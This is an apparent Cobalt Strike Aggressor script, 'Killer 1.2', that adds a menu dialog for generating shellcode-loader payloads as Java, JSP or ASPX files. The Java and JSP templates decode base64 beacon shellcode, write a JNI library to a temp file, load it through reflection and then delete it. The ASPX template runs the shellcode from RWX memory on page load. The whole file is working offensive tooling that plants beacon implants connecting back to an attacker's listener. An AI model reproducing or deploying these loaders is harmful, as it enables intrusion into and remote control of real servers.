# Killer 1.2
# Generate Payload (JAVA 、 JSP 、ASPX)
#
# Author: ke
# Reference:
#     https://blog.cobaltstrike.com/2013/08/29/how-to-inject-shellcode-from-java/
#     https://javasec.org/javase/JNI/

# prepare payload
sub setup_attack {
    local('%options $script $payload');
    %options = $3;

    if (%options["stageless"] eq "true"){
        # Generate stageless payload
        println("stageless");
        $payload = artifact_payload(%options["listener"], "raw", "x64");

    }else{
        # Generate stage payload
        println("stager");
        $payload = artifact_stager(%options["listener"], "raw", "x64");
    }

    # $b64payload now has my base64 encoded payload
    $b64payload = base64_encode($payload);

    $data = "";
    $b64Dll = "";

    if((%options["type"] eq "JAVA")) {
        $data = $data . "import java.io.*;\r\n";
        $data = $data . "import java.lang.reflect.*;\r\n";
        $data = $data . "import java.util.Vector;\r\n";
        $data = $data . "public class Report extends ClassLoader{\r\n";
        $data = $data . "    private static final String CLASS_NAME = \"Killer\";\r\n";
        $data = $data . "    private final static char intToBase64[] = {\r\n";
        $data = $data . "            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J',\r\n";
        $data = $data . "            'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',\r\n";
        $data = $data . "            'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd',\r\n";
        $data = $data . "            'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\r\n";
        $data = $data . "            'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',\r\n";
        $data = $data . "            'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7',\r\n";
        $data = $data . "            '8', '9', '+', '/'\r\n";
        $data = $data . "    };\r\n";
        $data = $data . "    private final static byte base64ToInt[] = {\r\n";
        $data = $data . "            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\r\n";
        $data = $data . "            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\r\n";
        $data = $data . "            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\r\n";
        $data = $data . "            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\r\n";
        $data = $data . "            -1, -1, -1, 62, -1, -1, -1, 63, 52, 53,\r\n";
        $data = $data . "            54, 55, 56, 57, 58, 59, 60, 61, -1, -1,\r\n";
        $data = $data . "            -1, -1, -1, -1, -1, 0, 1, 2, 3, 4,\r\n";
        $data = $data . "            5, 6, 7, 8, 9, 10, 11, 12, 13, 14,\r\n";
        $data = $data . "            15, 16, 17, 18, 19, 20, 21, 22, 23, 24,\r\n";
        $data = $data . "            25, -1, -1, -1, -1, -1, -1, 26, 27, 28,\r\n";
        $data = $data . "            29, 30, 31, 32, 33, 34, 35, 36, 37, 38,\r\n";
        $data = $data . "            39, 40, 41, 42, 43, 44, 45, 46, 47, 48,\r\n";
        $data = $data . "            49, 50, 51\r\n";
        $data = $data . "    };\r\n";
        $data = $data . "    public static byte[] decode(String source) {\r\n";
        $data = $data . "        int num=0;\r\n";
        $data = $data . "        int numBytes=0;\r\n";
        $data = $data . "        int eofBytes = 0;\r\n";
        $data = $data . "        java.io.ByteArrayOutputStream bout = new java.io.ByteArrayOutputStream();\r\n";
        $data = $data . "        for (int i = 0; i < source.length(); i++) {\r\n";
        $data = $data . "            char c = source.charAt(i);\r\n";
        $data = $data . "            if (Character.isWhitespace(c))\r\n";
        $data = $data . "                continue;\r\n";
        $data = $data . "            if (c == '=') {\r\n";
        $data = $data . "                eofBytes++;\r\n";
        $data = $data . "                num = num << 6;\r\n";
        $data = $data . "                switch (++numBytes) {\r\n";
        $data = $data . "                    case 1:\r\n";
        $data = $data . "                    case 2:\r\n";
        $data = $data . "                        throw new RuntimeException(\"Unexpected end of stream character (=)\");\r\n";
        $data = $data . "                    case 3:\r\n";
        $data = $data . "                        break;\r\n";
        $data = $data . "                    case 4:\r\n";
        $data = $data . "                        bout.write((byte) (num >> 16));\r\n";
        $data = $data . "                        if (eofBytes == 1)\r\n";
        $data = $data . "                            bout.write((byte) (num >> 8));\r\n";
        $data = $data . "                        break;\r\n";
        $data = $data . "                    case 5:\r\n";
        $data = $data . "                        throw new RuntimeException(\"Trailing garbage detected\");\r\n";
        $data = $data . "                    default:\r\n";
        $data = $data . "                        throw new IllegalStateException(\"Invalid value for numBytes\");\r\n";
        $data = $data . "                }\r\n";
        $data = $data . "                continue;\r\n";
        $data = $data . "            }\r\n";
        $data = $data . "            if (eofBytes > 0)\r\n";
        $data = $data . "                throw new RuntimeException(\"Base64 characters after end of stream character (=) detected.\");\r\n";
        $data = $data . "            if (c >= 0 && c < base64ToInt.length) {\r\n";
        $data = $data . "                int result = base64ToInt[c];\r\n";
        $data = $data . "                if (result >= 0) {\r\n";
        $data = $data . "                    num = (num << 6) + result;\r\n";
        $data = $data . "                    if (++numBytes != 4)\r\n";
        $data = $data . "                        continue;\r\n";
        $data = $data . "                    bout.write((byte) (num >> 16));\r\n";
        $data = $data . "                    bout.write((byte) (num >> 8 & 0xff));\r\n";
        $data = $data . "                    bout.write((byte) (num & 0xff));\r\n";
        $data = $data . "                    num = 0;\r\n";
        $data = $data . "                    numBytes = 0;\r\n";
        $data = $data . "                    continue;\r\n";
        $data = $data . "                }\r\n";
        $data = $data . "            }\r\n";
        $data = $data . "            if (!Character.isWhitespace(c))\r\n";
        $data = $data . "                throw new RuntimeException(\"Invalid Base64 character: \" + (int) c);\r\n";
        $data = $data . "        }\r\n";
        $data = $data . "        return bout.toByteArray();\r\n";
        $data = $data . "    }\r\n";
        $data = $data . "    private static final byte[] CLASS_BYTES = new byte[] {-54,-2,-70,-66,0,0,0,49,0,15,10,0,3,0,12,7,0,13,7,0,14,1,0,6,60,105,110,105,116,62,1,0,3,40,41,86,1,0,4,67,111,100,101,1,0,15,76,105,110,101,78,117,109,98,101,114,84,97,98,108,101,1,0,4,107,105,108,108,1,0,5,40,91,66,41,86,1,0,10,83,111,117,114,99,101,70,105,108,101,1,0,11,75,105,108,108,101,114,46,106,97,118,97,12,0,4,0,5,1,0,6,75,105,108,108,101,114,1,0,16,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,0,33,0,2,0,3,0,0,0,0,0,2,0,1,0,4,0,5,0,1,0,6,0,0,0,29,0,1,0,1,0,0,0,5,42,-73,0,1,-79,0,0,0,1,0,7,0,0,0,6,0,1,0,0,0,1,1,1,0,8,0,9,0,0,0,1,0,10,0,0,0,2,0,11};\r\n";
        $data = $data . "    protected Class<?> findClass(String name){\r\n";
        $data = $data . "        try {\r\n";
        $data = $data . "            return super.findClass(name);\r\n";
        $data = $data . "        } catch (ClassNotFoundException e) {\r\n";
        $data = $data . "            return defineClass(CLASS_NAME, CLASS_BYTES, 0, CLASS_BYTES.length);\r\n";
        $data = $data . "        }\r\n";
        $data = $data . "    }\r\n";
        $data = $data . "    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {\r\n";
        $data = $data . "        StringBuilder b64 = new StringBuilder();\r\n";
        $length = strlen($b64payload);
        $index = 0;
        while($length > $index){
            $data = $data . "b64.append(\"". substr($b64payload, $index, $index + 1000) ."\");\n";
            $index = $index + 1000;
        }
        $data = $data . "        byte[] shell = decode(b64.toString());\r\n";
        $data = $data . "        String JNI_FILE_BYTES = \"". $b64Dll . "\";\r\n";
        $data = $data . "        File library = File.createTempFile(\"apache10192\", \".cache\");\r\n";
        $data = $data . "        ClassLoader loader = new Report();\r\n";
        $data = $data . "        byte[] data = decode(JNI_FILE_BYTES);\r\n";
        $data = $data . "        FileOutputStream output = new FileOutputStream(library,false);\r\n";
        $data = $data . "        output.write(data, 0, data.length);\r\n";
        $data = $data . "        output.close();\r\n";
        $data = $data . "        try {\r\n";
        $data = $data . "            Class  commandClass = loader.loadClass(\"Killer\");\r\n";
        $data = $data . "            Object loadLib      = null;\r\n";
        $data = $data . "            if (loadLib == null || !((Boolean) loadLib)) {\r\n";
        $data = $data . "                java.lang.reflect.Method loadLibrary0Method = ClassLoader.class.getDeclaredMethod(\"loadLibrary0\", Class.class, java.io.File.class);\r\n";
        $data = $data . "                loadLibrary0Method.setAccessible(true);\r\n";
        $data = $data . "                loadLibrary0Method.invoke(loader, commandClass, library);\r\n";
        $data = $data . "            }\r\n";
        $data = $data . "            java.lang.reflect.Constructor constructor = commandClass.getDeclaredConstructor();\r\n";
        $data = $data . "            Object instance = constructor.newInstance();\r\n";
        $data = $data . "            commandClass.getMethod(\"kill\", byte[].class).invoke(instance, shell);\r\n";
        $data = $data . "        } catch (Exception e) {\r\n";
        $data = $data . "        }\r\n";
        $data = $data . "        try{\r\n";
        $data = $data . "            Field field = ClassLoader.class.getDeclaredField(\"nativeLibraries\");\r\n";
        $data = $data . "            field.setAccessible(true);\r\n";
        $data = $data . "            Vector<Object> libraryVictor = (Vector<Object>)field.get(loader);\r\n";
        $data = $data . "            for(Object obj : libraryVictor){\r\n";
        $data = $data . "                Class clazz = obj.getClass();\r\n";
        $data = $data . "                Field nameField = clazz.getDeclaredField(\"name\");\r\n";
        $data = $data . "                nameField.setAccessible(true);\r\n";
        $data = $data . "                String jniName = (String)nameField.get(obj);\r\n";
        $data = $data . "                if(jniName.contains(\"apache10192\")){\r\n";
        $data = $data . "                    Method method = clazz.getDeclaredMethod(\"finalize\");\r\n";
        $data = $data . "                    method.setAccessible(true);\r\n";
        $data = $data . "                    method.invoke(obj);\r\n";
        $data = $data . "                    if(library.exists()){\r\n";
        $data = $data . "                        library.delete();\r\n";
        $data = $data . "                    }\r\n";
        $data = $data . "                }\r\n";
        $data = $data . "            }\r\n";
        $data = $data . "        }catch(Exception e){\r\n";
        $data = $data . "            e.printStackTrace();\r\n";
        $data = $data . "        }\r\n";
        $data = $data . "    }\r\n";
        $data = $data . "}\r\n";
    }else if((%options["type"] eq "JSP")){
        $data = $data . "<%!\r\n";
        $data = $data . "    private static final String COMMAND_CLASS_NAME = \"Killer\";\r\n";
        $data = $data . "    private final char intToBase64[] = {\r\n";
        $data = $data . "        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J',\r\n";
        $data = $data . "        'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',\r\n";
        $data = $data . "        'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd',\r\n";
        $data = $data . "        'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\r\n";
        $data = $data . "        'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',\r\n";
        $data = $data . "        'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7',\r\n";
        $data = $data . "        '8', '9', '+', '/'\r\n";
        $data = $data . "    };\r\n";
        $data = $data . "    private final byte base64ToInt[] = {\r\n";
        $data = $data . "        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\r\n";
        $data = $data . "        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\r\n";
        $data = $data . "        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\r\n";
        $data = $data . "        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,\r\n";
        $data = $data . "        -1, -1, -1, 62, -1, -1, -1, 63, 52, 53,\r\n";
        $data = $data . "        54, 55, 56, 57, 58, 59, 60, 61, -1, -1,\r\n";
        $data = $data . "        -1, -1, -1, -1, -1, 0, 1, 2, 3, 4,\r\n";
        $data = $data . "        5, 6, 7, 8, 9, 10, 11, 12, 13, 14,\r\n";
        $data = $data . "        15, 16, 17, 18, 19, 20, 21, 22, 23, 24,\r\n";
        $data = $data . "        25, -1, -1, -1, -1, -1, -1, 26, 27, 28,\r\n";
        $data = $data . "        29, 30, 31, 32, 33, 34, 35, 36, 37, 38,\r\n";
        $data = $data . "        39, 40, 41, 42, 43, 44, 45, 46, 47, 48,\r\n";
        $data = $data . "        49, 50, 51\r\n";
        $data = $data . "    };\r\n";
        $data = $data . "    public byte[] decode(String source) {\r\n";
        $data = $data . "        int num=0;\r\n";
        $data = $data . "        int numBytes=0;\r\n";
        $data = $data . "        int eofBytes = 0;\r\n";
        $data = $data . "        java.io.ByteArrayOutputStream bout = new java.io.ByteArrayOutputStream();\r\n";
        $data = $data . "        for (int i = 0; i < source.length(); i++) {\r\n";
        $data = $data . "            char c = source.charAt(i);\r\n";
        $data = $data . "            if (Character.isWhitespace(c))\r\n";
        $data = $data . "            continue;\r\n";
        $data = $data . "            if (c == '=') {\r\n";
        $data = $data . "            eofBytes++;\r\n";
        $data = $data . "            num = num << 6;\r\n";
        $data = $data . "            switch (++numBytes) {\r\n";
        $data = $data . "                case 1:\r\n";
        $data = $data . "                case 2:\r\n";
        $data = $data . "                throw new RuntimeException(\"Unexpected end of stream character (=)\");\r\n";
        $data = $data . "                case 3:\r\n";
        $data = $data . "                break;\r\n";
        $data = $data . "                case 4:\r\n";
        $data = $data . "                bout.write((byte) (num >> 16));\r\n";
        $data = $data . "                if (eofBytes == 1)\r\n";
        $data = $data . "                bout.write((byte) (num >> 8));\r\n";
        $data = $data . "                break;\r\n";
        $data = $data . "                case 5:\r\n";
        $data = $data . "                throw new RuntimeException(\"Trailing garbage detected\");\r\n";
        $data = $data . "                default:\r\n";
        $data = $data . "                throw new IllegalStateException(\"Invalid value for numBytes\");\r\n";
        $data = $data . "            }\r\n";
        $data = $data . "            continue;\r\n";
        $data = $data . "        }\r\n";
        $data = $data . "        if (eofBytes > 0)\r\n";
        $data = $data . "        throw new RuntimeException(\"Base64 characters after end of stream character (=) detected.\");\r\n";
        $data = $data . "        if (c >= 0 && c < base64ToInt.length) {\r\n";
        $data = $data . "            int result = base64ToInt[c];\r\n";
        $data = $data . "            if (result >= 0) {\r\n";
        $data = $data . "            num = (num << 6) + result;\r\n";
        $data = $data . "            if (++numBytes != 4)\r\n";
        $data = $data . "            continue;\r\n";
        $data = $data . "            bout.write((byte) (num >> 16));\r\n";
        $data = $data . "            bout.write((byte) (num >> 8 & 0xff));\r\n";
        $data = $data . "            bout.write((byte) (num & 0xff));\r\n";
        $data = $data . "            num = 0;\r\n";
        $data = $data . "            numBytes = 0;\r\n";
        $data = $data . "            continue;\r\n";
        $data = $data . "        }\r\n";
        $data = $data . "    }\r\n";
        $data = $data . "        if (!Character.isWhitespace(c))\r\n";
        $data = $data . "            throw new RuntimeException(\"Invalid Base64 character: \" + (int) c);\r\n";
        $data = $data . "    }\r\n";
        $data = $data . "        return bout.toByteArray();\r\n";
        $data = $data . "    }\r\n";
        $data = $data . "    private static final byte[] COMMAND_CLASS_BYTES = new byte[] {-54,-2,-70,-66,0,0,0,49,0,15,10,0,3,0,12,7,0,13,7,0,14,1,0,6,60,105,110,105,116,62,1,0,3,40,41,86,1,0,4,67,111,100,101,1,0,15,76,105,110,101,78,117,109,98,101,114,84,97,98,108,101,1,0,4,107,105,108,108,1,0,5,40,91,66,41,86,1,0,10,83,111,117,114,99,101,70,105,108,101,1,0,11,75,105,108,108,101,114,46,106,97,118,97,12,0,4,0,5,1,0,6,75,105,108,108,101,114,1,0,16,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,0,33,0,2,0,3,0,0,0,0,0,2,0,1,0,4,0,5,0,1,0,6,0,0,0,29,0,1,0,1,0,0,0,5,42,-73,0,1,-79,0,0,0,1,0,7,0,0,0,6,0,1,0,0,0,1,1,1,0,8,0,9,0,0,0,1,0,10,0,0,0,2,0,11};\r\n";
        $data = $data . "%>\r\n";
        $data = $data . "<%\r\n";
        $data = $data . "    java.lang.StringBuilder b64 = new java.lang.StringBuilder();\r\n";
        $length = strlen($b64payload);
        $index = 0;
        while($length > $index){
            $data = $data . "b64.append(\"". substr($b64payload, $index, $index + 1000) ."\");\n";
            $index = $index + 1000;
        }
        $data = $data . "    byte[] shell = decode(b64.toString());\r\n";
        $data = $data . "    String jniBytes = null;\r\n";
        $data = $data . "    String COMMAND_JNI_FILE_BYTES = \"" . $b64Dll . "\";\r\n";
        $data = $data . "\r\n";
        $data = $data . "    java.io.File library = java.io.File.createTempFile(\"apache10192\", \".cache\");\r\n";
        $data = $data . "        java.lang.ClassLoader loader = null;\r\n";
        $data = $data . "        if (loader == null) {\r\n";
        $data = $data . "            loader = new java.lang.ClassLoader(this.getClass().getClassLoader()) {\r\n";
        $data = $data . "                @Override\r\n";
        $data = $data . "                protected Class<?> findClass(String name) throws ClassNotFoundException {\r\n";
        $data = $data . "                    try {\r\n";
        $data = $data . "                        return super.findClass(name);\r\n";
        $data = $data . "                    } catch (ClassNotFoundException e) {\r\n";
        $data = $data . "                        return defineClass(COMMAND_CLASS_NAME, COMMAND_CLASS_BYTES, 0, COMMAND_CLASS_BYTES.length);\r\n";
        $data = $data . "                    }\r\n";
        $data = $data . "                }\r\n";
        $data = $data . "            };\r\n";
        $data = $data . "        }\r\n";
        $data = $data . "        byte[] data = decode(COMMAND_JNI_FILE_BYTES);\r\n";
        $data = $data . "        java.io.FileOutputStream output = new java.io.FileOutputStream(library,false);\r\n";
        $data = $data . "        output.write(data, 0, data.length);\r\n";
        $data = $data . "        output.close();\r\n";
        $data = $data . "        try {\r\n";
        $data = $data . "            java.lang.Class  commandClass = loader.loadClass(\"Killer\");\r\n";
        $data = $data . "            Object loadLib      = null;\r\n";
        $data = $data . "            if (loadLib == null || !((Boolean) loadLib)) {\r\n";
        $data = $data . "                java.lang.reflect.Method loadLibrary0Method = java.lang.ClassLoader.class.getDeclaredMethod(\"loadLibrary0\", Class.class, java.io.File.class);\r\n";
        $data = $data . "                loadLibrary0Method.setAccessible(true);\r\n";
        $data = $data . "                loadLibrary0Method.invoke(loader, commandClass, library);\r\n";
        $data = $data . "            }\r\n";
        $data = $data . "            java.lang.reflect.Constructor constructor = commandClass.getDeclaredConstructor();\r\n";
        $data = $data . "            Object instance = constructor.newInstance();\r\n";
        $data = $data . "            commandClass.getMethod(\"kill\", byte[].class).invoke(instance, shell);\r\n";
        $data = $data . "        } catch (Exception e) {\r\n";
        $data = $data . "        }\r\n";
        $data = $data . "        try{\r\n";
        $data = $data . "            java.lang.reflect.Field field = java.lang.ClassLoader.class.getDeclaredField(\"nativeLibraries\");\r\n";
        $data = $data . "            field.setAccessible(true);\r\n";
        $data = $data . "            java.util.Vector<Object> libraryVictor = (java.util.Vector<Object>)field.get(loader);\r\n";
        $data = $data . "            for(Object obj : libraryVictor){\r\n";
        $data = $data . "                Class clazz = obj.getClass();\r\n";
        $data = $data . "                java.lang.reflect.Field nameField = clazz.getDeclaredField(\"name\");\r\n";
        $data = $data . "                nameField.setAccessible(true);\r\n";
        $data = $data . "                String jniName = (String)nameField.get(obj);\r\n";
        $data = $data . "                if(jniName.contains(\"apache10192\")){\r\n";
        $data = $data . "                    java.lang.reflect.Method method = clazz.getDeclaredMethod(\"finalize\");\r\n";
        $data = $data . "                    method.setAccessible(true);\r\n";
        $data = $data . "                    method.invoke(obj);\r\n";
        $data = $data . "                    if(library.exists()){\r\n";
        $data = $data . "                        library.delete();\r\n";
        $data = $data . "                    }\r\n";
        $data = $data . "                }\r\n";
        $data = $data . "            }\r\n";
        $data = $data . "        }catch(Exception e){\r\n";
        $data = $data . "            e.printStackTrace();\r\n";
        $data = $data . "        }\r\n";
        $data = $data . "%>\r\n";
    }else if((%options["type"] eq "ASPX")){
        $data = $data . "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" Inherits=\"System.Web.UI.Page\" %>\r\n";
        $data = $data . "<%@ Import Namespace=\"System\" %>\r\n";
        $data = $data . "<%@ Import Namespace=\"System.Runtime.InteropServices\" %>\r\n";
        $data = $data . "<script Language=\"c#\" runat=\"server\">\r\n";
        $data = $data . "    delegate int Proc();\r\n";
        $data = $data . "    protected void Page_Load(object sender, EventArgs e)\r\n";
        $data = $data . "    {byte[] codeBytes = Convert.FromBase64String(\"" . $b64payload . "\");\r\n";
        $data = $data . "        IntPtr handle = IntPtr.Zero;\r\n";
        $data = $data . "        handle = VirtualAlloc(IntPtr.Zero,codeBytes.Length, 0x1000 | 0x2000, 0x40);\r\n";
        $data = $data . "        try{Marshal.Copy(codeBytes, 0, handle, codeBytes.Length);\r\n";
        $data = $data . "            Proc proc = Marshal.GetDelegateForFunctionPointer(handle, typeof(Proc)) as Proc;proc();}\r\n";
        $data = $data . "        finally{VirtualFree(handle, 0, 0x8000);}}\r\n";
        $data = $data . "    [DllImport(\"Kernel32.dll\", EntryPoint = \"VirtualAlloc\")]\r\n";
        $data = $data . "    public static extern IntPtr VirtualAlloc(IntPtr address, int size, uint allocType, uint protect);\r\n";
        $data = $data . "    [DllImport(\"Kernel32.dll\", EntryPoint = \"VirtualFree\")]\r\n";
        $data = $data . "    public static extern bool VirtualFree(IntPtr address, int size, uint freeType);\r\n";
        $data = $data . "</script>\r\n";
    }
    if((%options["type"] eq "JAVA")){
        prompt_file_save("Report.java", {
            local('$handle');
            $handle = openf("> $+ $1");
            writeb($handle, $data);
            closef($handle);
        });
    }else if((%options["type"] eq "JSP")){
        println("jsp mode");
        prompt_file_save("Report.jsp", {
            local('$handle');
            $handle = openf("> $+ $1");
            writeb($handle, $data);
            closef($handle);
        });
    }else if((%options["type"] eq "ASPX")){
        println("aspx mode");
        prompt_file_save("Report.aspx", {
            local('$handle');
            $handle = openf("> $+ $1");
            writeb($handle, $data);
            closef($handle);
        });
    }
}

popup attacks{
    
    item "JAVA/JSP/ASPX Payload" {
        local('$dialog %defaults');

        %defaults["stageless"] = "false";
    

        # create our dialog
        $dialog = dialog("Generate JAVA/ASPX Payload v1.2", %defaults, &setup_attack);
        dialog_description($dialog, "Generate a JAVA/ASPX Payload");
        drow_listener_stage($dialog, "listener", "Listener: ");
        drow_checkbox($dialog, "stageless", "Stageless:", "Use Stageless Payload");
        drow_combobox($dialog, "type", "Type: ", @("JAVA","JSP" ,"ASPX"));
        dbutton_action($dialog, "Launch");

        # show our dialog
        dialog_show($dialog);
    }
}
